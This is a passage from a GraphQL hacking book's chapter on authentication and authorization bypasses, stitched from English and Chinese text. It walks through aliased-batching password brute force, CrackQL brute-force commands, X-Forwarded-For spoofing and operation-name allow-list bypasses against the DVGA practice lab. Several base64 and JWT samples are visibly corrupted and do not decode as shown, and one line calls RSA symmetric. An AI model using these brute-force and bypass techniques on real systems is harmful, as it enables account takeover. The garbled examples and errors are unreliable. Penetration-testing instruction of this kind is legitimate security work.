  \ and debug messages.\n\nWith all these GraphQL information disclosure tools and\
  \ techniques, you should feel confident about your ability to extract application\
  \ secrets, user details, PII, and system information that will propel your future\
  \ GraphQL attacks.\n"
- "## 7\n\n## AUTHENTICATION AND AUTHORIZATION BYPASSES\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_188_0.png)\n\
  \nOut of the box, GraphQL has no authentication or authorization controls. As a\
  \ result, the ecosystem has created its own or adopted those seen in traditional\
  \ systems. In this chapter, we’ll cover the common GraphQL authentication and authorization\
  \ implementations. Then we’ll discuss attacks that target some of their weaknesses.\n\
  \n*Authentication* is the mechanism by which a client proves their identity to a\
  \ server. It answers the question: Is the user really who they say they are? Authentication\
  \ attacks target a client’s identity, attempting to either steal credentials or\
  \ spoof them to authenticate with a server, take certain actions on their behalf,\
  \ or steal data to which they have access.\n\n*Authorization* controls are responsible\
  \ for granting access to data and ensuring that the actions an entity takes, whether\
  \ they’re a human or a machine, match their assigned roles, groups, and permissions.\
  \ Authorization attacks attempt to either bypass a security control entirely or\
  \ poke holes in\n\nit, allowing an attacker to take actions that wouldn’t otherwise\
  \ be possible. For example, they might gain unauthorized access to system data or\
  \ perform privileged actions, such as setting another user’s password.\n\nAuthentication\
  \ and authorization controls can be challenging to implement. This is especially\
  \ true when an application creates its own mechanisms from scratch instead of using\
  \ the many battle-tested frameworks available for specific programming languages.\
  \ Performing security testing of such controls is also a nontrivial task; security\
  \ tools (such as API application scanners) struggle to identify authorization and\
  \ authentication issues. One of the primary reasons is that scanners have no contextual\
  \ understanding of the application’s business logic.\n\nFor years, hackers have\
  \ defeated both authentication and authorization defenses by taking advantage of\
  \ weak passwords, default credentials, forged tokens, flawed account recovery processes,\
  \ replay attacks, and poor rate-limit controls. Not only is exploiting these weaknesses\
  \ possible in GraphQL implementations, but, in many cases, GraphQL’s client-empowering\
  \ features actually enable hackers to optimize their attacks, as you’ll soon learn.\n\
  \n## The State of Authentication and Authorization in GraphQL\n\nThe GraphQL spec\
  \ has left implementers to fend for themselves when it comes to authentication and\
  \ authorization. This lack of a detailed standard has led developers to select and\
  \ deploy their own GraphQL authentication and authorization controls from a variety\
  \ of libraries, tools, and configurations, often leading to vulnerabilities and\
  \ implementation gaps.\n\nIn this section, we’ll sink our teeth into the ecosystem-driven\
  \ authentication and authorization services, libraries, and plug-ins available for\
  \ GraphQL. Broadly, these approaches follow two distinct architectural deployment\
  \ models: in-band and out-of-band.\n\n## In-Band vs. Out-of-Band\n\nIn an in-band\
  \ authentication and authorization architecture, developers implement client login,\
  \ signup, role-based access controls, and other permission controls directly in\
  \ the GraphQL API. The same GraphQL instance that provides clients with their application\
  \ data also controls the logic that authenticates clients and grants them permissions\
  \ to view data. In-band GraphQL architectures typically host query or mutation operations\
  \ that enable clients to send credentials to the API. The API is responsible for\
  \ verifying these credentials and then issuing tokens to the clients.\n\nOut-of-band\
  \ authentication and authorization architectures implement the access control and\
  \ permissions logic on either a separate internal web application service or an\
  \ external system. In such an architecture, the GraphQL API isn’t responsible for\
  \ managing client login, signup, or even access control. Instead, it offloads authorization\
  \ decisions to another component, such as an API gateway, a container sidecar, or\
  \ another server on the network. This allows developers to decouple the authorization\
  \ logic from the GraphQL application.\n\nOf the two architectural styles, in-band\
  \ architectures tend to be more vulnerable to authentication and authorization attacks.\
  \ Their added complexity increases an API's attack surface drastically. These APIs\
  \ often duplicate permission logic for each entry point into the service, and as\
  \ you'll see later in this chapter, we, as hackers, can take advantage of even the\
  \ slightest misaligned control.\n\nThus, some contributors to the GraphQL ecosystem\
  \ advocate for keeping authentication and authorization logic outside of GraphQL.\
  \ The current industry best practice is to delegate authorization logic to the *business\
  \ logic layer* of an application, which serves as the single source of truth for\
  \ all business domain rules. It should sit between the GraphQL layer and the *persistence\
  \ layer* (also known as the *database* or *datastore* layer), as shown in Figure\
  \ 7-1.\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_190_0.png)\n\nFigure 7-1: The\
  \ gateway, API, business, and persistence layers\n\nBy contrast, authentication\
  \ for the entire GraphQL API should occur in an external or third-party *gateway\
  \ layer*, which passes authenticated user contexts along to the API.\n\n## Common\
  \ Approaches\n\nThere is no way to know what kinds of controls you'll come across\
  \ during your GraphQL hacking adventures. However, this section lists some of the\
  \ common approaches we've seen in our research and testing. By understanding these\
  \ techniques, you'll be better equipped to detect them, as well as evaluate the\
  \ vulnerabilities to which they may be susceptible.\n\n## HTTP Basic Authentication\n\
  \nOne of the most rudimentary GraphQL authentication methods is *HTTP basic authentication*.\
  \ Defined in RFC 7617, this scheme involves the inclusion of a Base64-encoded username\
  \ and password in the header of a client request. The header looks as follows:\n\
  \n```\nAuthorization: Basic <base64_encoded_credential>\n```\n\n\n\n\nBase64 编码的用户名和密码通过冒号连接成单个凭证。\n\
  \nBasic 认证是一种简单的技术，不需要 cookie、会话标识符或登录页面。要检测 Basic 认证，我们可以使用浏览器。图 7-2 是浏览器用于收集并编码\
  \ Basic 认证凭证的自动弹出窗口示例。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_191_0.png)\n\n\
  图 7-2：Basic 认证的浏览器弹出窗口示例\n\n这种方法的一个弱点是，在通过 HTTP 将凭证传输到 GraphQL 服务器时缺乏保密保护。想象一下如下的\
  \ Basic 认证头部：\n\n```\nAuthorization: Basic YWRtaW46YmxhY2toYXRNcmFwaHF sCg==\n```\n\
  \n由于凭证使用 Base64 编码并且在每次请求中发送（相比之下，其他系统可能在登录时生成临时会话令牌），窃取此类凭证的攻击窗口更大。通过使用 TLS 可以缓解通过未加密通道传输凭证的风险。但是，如果凭证被窃取，攻击者可以相当容易地对其进行\
  \ Base64 解码。要测试这一点，请打开终端并运行以下命令：\n\n```\n# echo \"YWRtaW46YmxhY2toYXRNcmFwaHF sCg==\"\
  \ | base64 -d\nadmin:blackhatgraphql\n```\n\nBasic 认证的另一个弱点是缺乏支持的注销功能，该功能会使凭证失效。窃取\
  \ Basic 认证凭证的攻击者将永久访问 API，直到管理员更改凭证为止。很少看到 Basic 认证用于生产级应用程序。你更有可能在测试或暂存环境中偶然发现该机制，作为保护应用程序的快速而粗糙的方法，但任何事情皆有可能！\n\
  \n## OAuth 2.0 和 JSON Web Token\n\n*Open Authorization (OAuth)* 是一种授权框架，使第三方能够通过在用户和\
  \ API 之间协调授权流程，或允许第三方应用程序代表用户获取访问权限，从而获得对诸如 GraphQL API 之类的 HTTP 服务的临时访问权限。\n\n\
  如果你曾经通过点击类似 *Log in with Google* 的按钮登录网站，那么你可能以前遇到过 OAuth。我们将在本节中仅触及 OAuth 2.0 的表面，但如果你有兴趣了解更多信息，可以在\
  \ *https://datatracker.ietf.org/doc/html/rfc6749.* 找到信息。\n\n想象一下，你正在对一个应用程序进行渗透测试，例如具有登录机制以防止未经授权访问的电子商务应用。OAuth\
  \ 协议允许电子商务应用（或 OAuth 术语中的 *client*）向 *resource owner*（你，渗透测试人员，需要登录）请求授权。当授权请求被授予（也称为\
  \ *authorization grant*）时，电子商务应用将获得一个访问令牌，可用于访问资源服务器上的某些资源。此资源服务器可以是 GraphQL 服务器。它将检查访问令牌，如果发现有效，则通过允许客户端对资源（也称为\
  \ *protected resource*）执行查询来提供服务。\n\n利用 OAuth 2.0 框架的应用程序可以使用 *JSON Web Token (JWT)*\
  \ 作为其令牌格式。JWT 是一种开放标准（定义于 RFC 7519），允许通过 JSON 对象在系统之间安全传输信息。服务器可以通过数字签名和加密验证 JWT\
  \ 令牌。JWT 令牌包含三个不同的部分，它们经过 Base64 编码并由句点 (.) 分隔，如清单 7-1 所示。这三个部分是头部、负载和签名。\n\n```\n\
  eyJo eXA iOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJo eXB Ijoi YWNjZXNzIwiaWF0Ijo xNjU2NDY0MDIyLCJcJvMyiOjE2NTYONjOwMjIsImpoaSI6ImY0oThmZmQxlWU0YzctNGU\
  \ 5Mi0sZTRhLWJw iNzRiZmVjZTE4ZiIsImIkzW50aXR5Ijoib3b1c mFob3iI1C1eHAiojE 2NTYONzEyMj9.NHs6Ji1DONJsC9LpJzdBB8enXzIrqIO\
  \ C vqojj8SqA4s\n```\n\n*清单 7-1：一个示例 JWT 令牌*\n\n*头部*，或 JWT 令牌的第一部分，定义了两个重要细节：令牌类型和签名算法。当我们对该头部进行\
  \ Base64 解码时，应该可以看到其内容：\n\n```\n# echo eyJo eXA iOiJKV1QiLCJhbGciOiJIUzI1NiJ9 |\
  \ base64 -d\n{\n  \"typ\": \"JWT\",\n  \"alg\": \"HS256\"\n}\n```\n\nNOTE 要使用图形界面对整个\
  \ JWT 令牌进行编码和解码并验证其签名，可以使用 https://jwt.io。请记住，为了验证 JWT 令牌的签名，你必须拥有用于签署令牌的密钥。\n\n\
  typ 键是头部参数，声明 JWT 令牌的结构化媒体类型信息。在本例中，媒体类型为 JWT。可能的媒体类型完整列表可以在 https://www.iana.org/assignments/media-types/media-types.xhtml\
  \ 找到。此头部参数被视为可选，但可以设置，以便读取头部的应用程序了解对象类型结构。\n\nalg 键定义用于确保令牌完整性的 JWT 令牌签名算法。此键可以表示不同的签名算法，例如：\n\
  \n- 无数字签名 (none)\n- 使用 SHA-256 的 HMAC (HS256)\n- 使用 SHA-384 的 HMAC (HS384)\n- 使用\
  \ SHA-256 的 RSA (RS256)\n- 使用 SHA-384 的 RSA (RS384)\n\n基于哈希的消息认证码（HMAC）是一种对称加密认证技术（意味着使用共享密钥），而\
  \ Rivest-Shamir-Adleman（RSA）是对称的（使用公钥和私钥对）。签名算法的完整列表可以在 RFC 7518 中找到。\n\n针对使用 JWT\
  \ 的应用程序的常见攻击涉及将 alg 头部参数设置为 none。如果应用程序接受未签名的 JWT 令牌，黑客可以篡改其 JWT 令牌以冒充另一用户或执行敏感操作。\n\
  \n负载部分，或 JWT 的第二部分，包含有关用户的信息，以及开发人员可能认为有用的任何额外数据。在我们的示例中，解码后的负载应与此输出匹配：\n\n```\n\
  # echo \"eyJoeXBlIjoiYWNjZXNziwiaWFOIjoxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIsImpoaSI6ImY0OT8fdm0xWLUOYzctNGU5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImtkZW5OaXR5Ijoi\
  \ b3BlcmFob3IiLCJleHAiOjE2NTY0NzEyMj9j\" | base64 -d\n{\n  \"type\": \"access\"\
  ,\n  \"iat\": 1656464022,\n  \"nbf\": 1656464022,\n  \"jti\": \"f498ffd1-e4c7-4e92-9e4a-bb74bfece18f\"\
  ,\n  \"identity\": \"operator\",\n  \"exp\": 1656471222\n}\n```\n\n大多数 JWT 负载将包含一些标准元素，称为声明，包括\
  \ iat 字段，表示 JWT 启动的时间戳，以及 exp 字段，表示 Unix 时间戳格式的过期时间戳。你可以通过阅读 RFC 7519 文档了解有关 JWT\
  \ 字段的更多信息。\n\nJWT 的最后一部分是 *签名*，它确保整个 JWT 未被篡改。对 JWT 的任何手动更改都应使此签名无效，导致 GraphQL 服务器拒绝令牌。正如你很快就会学到的，GraphQL\
  \ 服务器签名验证中的漏洞可能会允许攻击者伪造 JWT 令牌。在第 178 页的“伪造和泄露 JWT 凭证”中，我们将介绍一些常见的 JWT 实现弱点以及如何利用它们。\n\
  \n> NOTE\n> OAuth 2.0 也可以用于保护图形 GraphQL 客户端。你可以在 https://github.com/autom8ter/oauth-graphql-ide\
  \ 找到一个为 GraphQL Playground 添加 OAuth 保护支持的项目。\n\n## GraphQL Modules\n\n在测试基于 JavaScript\
  \ 的 GraphQL 实现时，你可能会遇到一个名为 *GraphQL Modules* 的实用库，由 The Guild 构建（https://www.the-guild.dev）。该库将\
  \ GraphQL 模式拆分为更小、可重用的模块，这些模块充当中间件。开发人员然后可以使用这些模块包装其解析器。清单 7-2 是 Authentication\
  \ 模块，它为 GraphQL 客户端提供标准的一组登录、注册和用户查找突变和查询。\n\n```\nextend type Query {\n  me: User\n\
  }\n\ntype Mutation {\n  login(username: String!, password: String!): User\n  signup(username:\
  \ String!, password: String!): User\n}\n\nextend type User {\n  username: String!\n\
  }\n```\n\n清单 7-2：来自 GraphQL Modules 库的 Authentication 模块\n\n正如你所见，该模块定义了一个名为 me\
  \ 的查询，它返回一个 User 对象，以及两个名为 login 和 signup 的突变，它们接受 username 和 password 参数并返回一个 User\
  \ 对象。\n\n开发人员也可以在不使用外部库的情况下在 GraphQL API 中实现自定义登录查询和注册突变操作。在第 171 页的“身份验证测试”中，我们将教你如何使用第\
  \ 5 章中介绍的批处理查询和第 2 章中安装的 CrackQL 来击败像这里提到的这样的内联身份验证操作。\n\n## GraphQL Shield\n\n\
  *GraphQL Shield* 是另一个由 The Guild 构建的中间件库，用于在 GraphQL API 中生成授权层。它允许开发人员定义\n\n\n\n\
  rules that either permit or deny client access. Listing 7-3 shows queries and mutations\
  \ protected by GraphQL Shield, which defines the permissions and roles required\
  \ to access each query.\n\n```\nconst permissions = shield({\n  Query: {\n    frontPage:\
  \ not(isAuthenticated),\n    fruits: and(isAuthenticated, or(isAdmin, isEditor)),\n\
  \    customers: and(isAuthenticated, isAdmin),\n  },\n  Mutation: {\n    addFruitToBasket:\
  \ isAuthenticated,\n  },\n  Fruit: isAuthenticated,\n  Customer: isAdmin,\n})\n\
  ```\n\nListing 7-3: A GraphQL Shield code example\n\nClients wishing to use the\
  \ frontPage query don’t have to be authenticated, as defined by the rule not(isAuthenticated),\
  \ whereas to use the customers query, they have to both be authenticated and have\
  \ an admin user, as indicated by and(isAuthenticated, isAdmin). The and operator\
  \ mandates that both conditions must be true for permission to be granted.\n\nA\
  \ developer community actively maintains GraphQL Shield and continuously improves\
  \ it. As of this writing, the last documented vulnerability in GraphQL Shield was\
  \ an authorization bypass that dates back to 2020 in versions earlier than 6.0.6.\n\
  \nWhen performing a code review, look for the GraphQL Shield component called the\
  \ fallbackRule. This rule can determine whether a request should be allowed or denied\
  \ by default whenever a rule is not defined. By default, fallbackRule is set to\
  \ allow. To read more about GraphQL Shield rules, refer to the official documentation\
  \ at https://www.graphql-shield.com/docs/rules#logic-rules.\n\n## Schema Directives\n\
  \nGraphQL deployments might use custom schema-level directives to apply both authentication\
  \ and authorization controls on certain operations and fields. By decorating schema\
  \ components, these custom directives can control what clients can and can’t do\
  \ in the API. We can use them to enforce security at the query level, type level,\
  \ field level, and so on.\n\nThe graphql-directive-auth library (https://github.com/graphql-community/graphql-directive-auth)\
  \ provides one example of how developers could apply directives to solve authentication\
  \ and authorization gaps in their APIs. In some implementations, the @auth directive\
  \ accepts a requires argument, which takes a string value representing the role\
  \ or group a user needs in order to query the field. Clients usually send these\
  \ user groups or roles through a JWT payload. The directive logic analyzes these\
  \ to either allow or deny access to protected elements of the schema.\n\nAuthorization\
  \ directives can have various other names or arguments. Table 7-1 is a list of common\
  \ ones you might encounter in your introspection hunts.\n\n## Table 7-1: Common\
  \ GraphQL Authorization Directives\n\n| Directive name | Argument name | Argument\
  \ type |\n|---|---|---|\n| @auth | requires | String |\n| @protect | role | String\
  \ |\n| @hasRole | role | String |\n\nSome @auth directives might also use an argument\
  \ called permissions, which accepts a list of scope grants.\n\n## IP-Based Allow\
  \ Listing\n\nSome GraphQL APIs, particularly those deployed in internal systems\
  \ that aren't public facing, may choose not to authenticate individual client requests.\
  \ Instead, they might opt to use an allow list of source IP addresses to authorize\
  \ clients. In this technique, the server checks the client IP address included in\
  \ a network request against a list of addresses or network range (such as 10.0.0.0/24).\n\
  \nThis IP address often gets passed to the API by a public-facing network device,\
  \ such as a reverse proxy or a load balancer. Applications will then attempt to\
  \ discover the IP address by looking for HTTP headers set on incoming requests.\
  \ A few common HTTP headers for this purpose are X-Forwarded-For, X-Real-IP, X-Originating-IP,\
  \ and X-Host.\n\nBecause clients can spoof these headers, reverse proxies may blindly\
  \ forward misinformation to the application. For example, here is how you might\
  \ pass a custom X-Forwarded-For header to DVGA with cURL:\n\n```\n# curl -X POST\
  \ http://localhost:5013/graphql -d '{\"query\":\"{ __typename }\"}'\n-H \"Content-Type:\
  \ application/json\" -H \"X-Forwarded-For: 10.0.0.1\"\n```\n\nIf the application\
  \ allows only requests to the GraphQL API that originate from the network 10.0.0.0/24,\
  \ injecting such a header at a later stage could allow an attacker to bypass the\
  \ IP-based allow list and communicate with the application.\n\n## Authentication\
  \ Testing\n\nWhen you're testing GraphQL authentication, you'll encounter certain\
  \ operations that aren't protected by any authentication layer. For example, unauthenticated\
  \ users might have access to queries, while only authenticated users might be able\
  \ to perform more sensitive, state-changing actions using mutations. You might find\
  \ this model in use on a blog: any client can read posts, whereas only authenticated\
  \ users can write comments.\n\nIt’s important to do a thorough scan of the target\
  \ GraphQL server and schema for any unprotected queries. This section will outline\
  \ how you can detect and defeat certain GraphQL authentication controls.\n\n## Detecting\
  \ the Authentication Layer\n\nOne of the best ways to determine whether a target\
  \ GraphQL application is protected by an authentication layer is by sending it a\
  \ canary query. Use either of the introspection queries from Chapter 6 or craft\
  \ your own to probe the schema for a range of operations, objects, and types. Depending\
  \ on the response you receive, you may be able to detect the type of authentication\
  \ used, as well as the layer at which authentication controls are implemented. In\
  \ particular, keep an eye out for status codes, error messages, and differences\
  \ in the responses to query variations.\n\n## HTTP Status Codes\n\nA sure way to\
  \ verify that some sort of authentication layer exists on a GraphQL target is by\
  \ analyzing the HTTP response you receive after sending a canary query. Most GraphQL\
  \ implementations will always return a 200 OK status code, even when the query contains\
  \ typos or errors. However, if you receive a 403 Forbidden Error, it’s possible\
  \ that out-of-band authentication and authorization control, like a gateway or a\
  \ WAF, has blocked your request from reaching the API in the first place.\n\n##\
  \ Error Messages\n\nError messages can obviously reveal the presence of authentication\
  \ controls, but they might also tell us exactly what type of authentication the\
  \ API requires and where in the architecture these checks occur. Table 7-2 shows\
  \ a list of common in-band GraphQL authentication error messages and the authentication\
  \ implementation known to raise the error message by default.\n\n## Table 7-2: Common\
  \ GraphQL Authentication Errors\n\n| Error message | Possible authentication implementation\
  \ |\n|---|---|\n| Authentication credentials are missing. Authorization header is\
  \ required and must contain a value. | OAuth 2.0 Bearer with JSON Web Token |\n\
  | Not Authorised! | GraphQL Shield |\n| Not logged in\nAuth required\nAPI key is\
  \ required | GraphQL Modules |\n| Invalid token!\nInvalid role! | graphql-directive-auth\
  \ |\n\nError messages can be customized and might differ from those shown here.\
  \ Reference Chapter 6 for additional information on how to abuse errors to extract\
  \ valuable information from GraphQL. For example, a combination\n\nof a 200 OK status\
  \ code and an error message could indicate that authentication is required. Because\
  \ these details may vary from one GraphQL API to another, we recommend checking\
  \ all avenues.\n\n## Authentication-Related Fields\n\nAnother great way to detect\
  \ an authentication layer is to use introspection queries to identify any authentication-related\
  \ query or mutation operations. By design, in-band GraphQL authentication requires\
  \ authentication, session management, and identity-based operations. For example,\
  \ a client will most likely need to send unauthenticated mutation requests that\
  \ perform login and sign-up operations to create and access their authenticated\
  \ accounts. We can use the introspection query in Listing 7-4 to analyze the schema\
  \ for any mutation operations related to authentication.\n\n```\n{ __schema { mutationType\
  \ { name kind fields { name description } } } }\n```\n\nListing 7-4: An introspection\
  \ query used to identify all mutations\n\nCheck whether the query returns any mutation\
  \ names similar to these:\n\n- me\n- login\n- logout\n- signup\n- register\n- createUser\n\
  - createAccount\n\nIf so, you can infer that the API has an authentication layer,\
  \ which means you can begin testing its resiliency against password brute-force\
  \ attacks.\n\n## Brute-Forcing Passwords by Using Query Batching\n\nA classic authentication\
  \ attack, password brute-forcing works against systems that fail to implement rate\
  \ limits or other automated account-takeover prevention controls. To perform one,\
  \ an attacker sends many login requests to a system in an attempt to correctly guess\
  \ a password. This programmatic attack usually accepts a dictionary of possible\
  \ user credentials or iterates through a sequence of characters to generate possible\
  \ credential combinations.\n\n\n\n\n\n诸如 WAF 之类的安全控制在防止单个客户端发出过多的 HTTP 请求方面非常有效，并且在检测到此类活动时通常会限制或禁止该客户端。然而，在第\
  \ 5 章中，我们介绍了查询批处理，它本质上允许客户端在一个 HTTP 请求中打包多个查询操作。我们可以利用此批处理功能，通过在单个 HTTP 请求中使用多个操作来暴力破解凭据，从而有效地规避诸如\
  \ WAF 之类的安全控制。\n\n有两种类型的批处理操作：基于数组的和基于别名的。像 BatchQL 这样的工具利用基于数组的查询批处理在单个请求中发送多个操作。然而，如果你回到第\
  \ 3 章图 3-4 中显示的 GraphQL 威胁矩阵截图，你会注意到很少有 GraphQL 实现支持这种类型的批处理。相比之下，所有主要的 GraphQL\
  \ 实现都支持基于别名的查询批处理，因为它在 GraphQL 规范中定义。\n\n让我们使用别名对 DVGA 的 GraphQL 认证层执行密码暴力破解攻击。首先，我们需要在单个\
  \ GraphQL 文档中包含使用不同凭据的多个登录操作。清单 7-5 显示了一个包含 10 个登录突变别名的 GraphQL 文档，针对 DVGA 中的 admin\
  \ 和 operator 用户账户。你也可以在本书的 GitHub 仓库中找到该查询，地址为 https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/ch07/password-brute-force.graphql。\n\
  \n每个别名操作都有一个唯一的标识符，以及一个目标用户名和一个可能的密码。如果其中一个操作成功，服务器应在响应中返回被攻击用户的 JWT 访问令牌（accessToken）：\n\
  \n```\nmutation {\n    alias1: login(username: \"admin\", password: \"admin\") {\n\
  \        accessToken\n    }\n    alias2: login(username: \"admin\", password: \"\
  password\") {\n        accessToken\n    }\n    alias3: login(username: \"admin\"\
  , password: \"pass\") {\n        accessToken\n    }\n    alias4: login(username:\
  \ \"admin\", password: \"pass123\") {\n        accessToken\n    }\n    alias5: login(username:\
  \ \"admin\", password: \"password123\") {\n        accessToken\n    }\n    alias6:\
  \ login(username: \"operator\", password: \"operator\") {\n        accessToken\n\
  \    }\n    alias7: login(username: \"operator\", password: \"password\") {\n  \
  \      accessToken\n    }\n    alias8: login(username: \"operator\", password: \"\
  pass\") {\n        accessToken\n    }\nalias9: login(username: \"operator\", password:\
  \ \"pass123\"){\n  accessToken\n}\nalias10: login(username: \"operator\", password:\
  \ \"password123\"){\n  accessToken\n}\n```\n\n清单 7-5：使用批处理查询进行密码暴力破解示例\n\n对 DVGA\
  \ 执行此密码暴力破解查询将导致接下来显示的大型响应。如你所见，其中大部分数据由 Authentication Failure 错误组成。然而，对于 alias10，我们收到了一个有效的\
  \ accessToken，这意味着我们成功暴力破解了 operator 密码，其设置为 password123。\n\n```\n{\n  \"errors\"\
  : [\n    {\n      \"message\": \"Authentication Failure\",\n      \"locations\"\
  : [\n        {\n          \"line\": 2,\n          \"column\": 5\n        }\n   \
  \   ],\n      \"path\": [\n        \"alias1\"\n      ]\n    },\n    --snip--\n \
  \   {\n      \"message\": \"Authentication Failure\",\n      \"locations\": [\n\
  \        {\n          \"line\": 26,\n          \"column\": 5\n        }\n      ],\n\
  \      \"path\": [\n        \"alias9\"\n      ]\n    }\n  ],\n  \"data\": {\n  \
  \  \"alias1\": null,\n    --snip--\n    \"alias9\": null,\n    \"alias10\": {\n\
  \      \"accessToken\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBIIjoiYWNjZXNzaW9uIiwiaWF0IjoxNjU2OTcxMDc5LCJuYmYiOjE2NTY5NzEwNzksImp0aSI6IjQ3NmEwYTYxLTk0OGUtNDZmOS0yZDQmLTF1Mzk3MDAxMTNjYiIiSImIkZW5OaXR5Jjoib3BlcmFOb3IilCJleHAiOjE2NTY5NzgyNzI9.NJZ0ugXBWg-OoEcT2Uth-xeBFwqxS0_5Ag1Y7-L3EgiI\"\
  \n    }\n  }\n```\n\n即使安全控制通过禁止客户端每分钟发出超过例如五次 HTTP 登录请求来保护 API，此攻击也会规避此类逻辑，因为我们在执行\
  \ 10 次登录尝试时只发送了一个 HTTP 请求。\n\n## 使用 CrackQL 暴力破解密码\n\n手动构建成功暴力破解登录凭据所需的大型 GraphQL\
  \ 文档将非常耗时。在第 2 章中，你安装了一个名为 CrackQL 的 GraphQL 密码暴力破解和模糊测试工具。该工具接受单个 GraphQL 查询或突变操作，并使用\
  \ CSV 词表自动生成别名负载。让我们再次运行相同的密码暴力破解攻击，但这次使用 CrackQL 来自动化它。\n\n进入 CrackQL 目录，然后对 DVGA\
  \ 执行暴力破解攻击。-t（target）参数指定目标 GraphQL 端点 URL，-q（query）参数接受示例查询（login.graphql），-i（input）参数定义攻击中使用的用户名和密码列表。--verbose\
  \ 参数允许我们查看发送到 DVGA 之前的最终负载等附加信息。\n\n```\n# cd ~/CrackQL\n# python3 CrackQL.py -t\
  \ http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv\
  \ --verbose\n```\n\nCrackQL 预装了示例用户名和密码 CSV 字典，以及清单 7-6 中显示的 login.graphql 查询。如你所见，它包含一个带有两个嵌入变量\
  \ username 和 password 的单个 login 突变。CrackQL 使用 Jinja 模板语法，因此变量使用双大括号（{{}}）传递。\n\n\
  ```\nmutation {\n    login(username: {{username|str}}, password: {{password|str}})\
  \ {\n        accessToken\n    }\n}\n```\n\n清单 7-6：示例 CrackQL 登录暴力破解查询\n\n当你执行 CrackQL\
  \ 命令时，该工具将自动从 CSV 文件中取出每个用户名和密码变量，并将其注入到同一查询文档中的重复登录操作中。CrackQL 的详细输出提供负载详细信息以及输出结果：\n\
  \n```\nData:\n[{'alias1': {'data': None,\n    'inputs': {'password': 'admin', 'username':\
  \ 'admin'}}},\n--snip--\n\n{'alias9': {'data': None,\n    'inputs': {'password':\
  \ 'operator', 'username': 'pass123'}}},\n```\n\n```\n{'alias10': {'data': {'accessToken':\
  \ 'eyJoeXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJoeXB1joiYWNjZXNZIiwi aW aWFOIjoxNjU3MDQ2NjI5LCJcUjYmYioJE2N\
  \ TcWnNDY2MjksImpoa0SiGIjvKmZhkM2Y5LWNjNTUtNDcyYyYi1nZRhlTh iN2F1M2EyNGF1MiIsImIkzW5o\
  \ aXR5Ijoib3B1cmF0 b3JilLCJleH a0iOjE2NTcWNTM4Mjl9.Ba3zfvZqjDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA'},\
  \ 'inputs': {'password': 'password123', 'username': 'operator'}}] Errors: [{'alias1':\
  \ {'error': 'Authentication Failure', 'inputs': {'password': 'admin', 'username':\
  \ 'admin'}}}, {'alias2': {'error': 'Authentication Failure', 'inputs': {'password':\
  \ 'admin', 'username': 'password'}}}, --snip-- {'alias9': {'error': 'Authentication\
  \ Failure', 'inputs': {'password': 'password123', 'username': 'operator'}}}] [*]\
  \ Writing to directory results/localhost:5013_5bab6e\n```\n\n在 GraphQL 查询成本控制阻止执行大型查询批处理的情况下，CrackQL\
  \ 具有可选的 -b（batch）参数，你可以使用它来定义更有限的别名操作集，从而使你的攻击在雷达下飞行。\n\n你也可以将 CrackQL 用于各种其他攻击。使用可能的一次性密码令牌列表，CrackQL\
  \ 可以暴力破解双因素认证。它还可以执行账户枚举攻击，通过自动化扫描有效电子邮件或用户名的过程，或模糊唯一对象标识符以利用不安全的直接对象引用（IDOR）漏洞，其中，通过直接引用对象标识符，我们能够在未经授权的情况下访问该对象。\n\
  \n在对经过身份验证的查询执行攻击时，你可能需要传递身份验证头和可能的 cookie。CrackQL 允许你使用 config.py 文件来做到这一点，该文件接受\
  \ COOKIES 和 HEADERS 变量。以下是向工具提供自定义头和 cookie 的示例：\n\n```\n# cat config.py\n\nHEADERS\
  \ = {\"Authorization\": \"Bearer mytoken\"}\nCOOKIES = {\"session\":\"session-secret\"\
  }\n```\n\n在执行渗透测试时，你可以通过使用 Firefox 开发工具的网络选项卡等工具检查网络流量来获取这些头。查看你在对网站进行初始登录后发送的任何\
  \ GraphQL 请求。此时，你应该会看到唯一的身份验证头或会话 cookie。\n\n## 使用允许列表操作名称\n\n某些内部 GraphQL 实现可能会使一些查询和突变对未经身份验证的客户端公开，例如用于登录或账户注册的查询。其中一些部署使用基于操作名称的允许列表，这是一种薄弱的执行控制，以拒绝所有未经身份验证的\n\
  \n\nrequests 除非其操作名称在允许列表中，否则会被拒绝。然而，操作名称可以由客户端定义，因此攻击者只需伪造操作的名称即可绕过这些身份验证机制。\n\n\
  下面是一个未经过身份验证的 mutation 示例。可以看出，它允许用户注册一个新用户账户：\n\n```\nmutation RegisterAccount\
  \ {\n    register(username: \"operator\", password: \"password\"){\n        user_id\n\
  \    }\n}\n```\n\n实现可能会通过使用其操作名称 RegisterAccount 来将此 register 操作加入允许列表。作为攻击者，我们可以通过发送如\
  \ Listing 7-7 中所示的请求来利用这一点。\n\n```\nmutation RegisterAccount {\n    withdrawal(amount:\
  \ 100.00, from: \"ACT001\", dest: \"ACT002\"){\n        confirmationCode\n    }\n\
  }\n```\n\nListing 7-7: 一个可能通过使用允许列表中的操作名称来绕过身份验证的示例操作\n\n我们使用了允许的操作名称来使用 withdrawal\
  \ mutation 取款。\n\n## 伪造和泄露 JWT 凭证\n\n虽然 JWT 令牌可以使用 JSON Web Encryption（RFC 7516）进行加密，但通常并未加密。而当未加密时，它们可能会泄露敏感数据。例如，来看一下以下\
  \ payload 部分的内容：\n\n```\neyJoeXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJoeXBlijoiYWNjZXNwIiwiiaWFOIjoxNjU3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2Mjk\
  \ sImpoaSI6IjVkMzhkM2Y5LWnNjNTUTNDcyYy1iNzRh1Th iNzFIMzEyNGF1MiIsImIkZW5o aXR5Ijoib3B1cmFob3IilC1leHAiOjE2NTcwNTM4MjksImFwaV9ob2t1biI6IkFQSV9TRUNSRVRfUEFTU1dPUkQifQ.iIQ9zMRP2bAOYx8p7INur\
  \ fC-PcVz-KqfzE4uQICbc\n```\n\n当我们对 payload 进行 Base64 解码时，我们发现 payload 部分中存在一个硬编码的凭证\
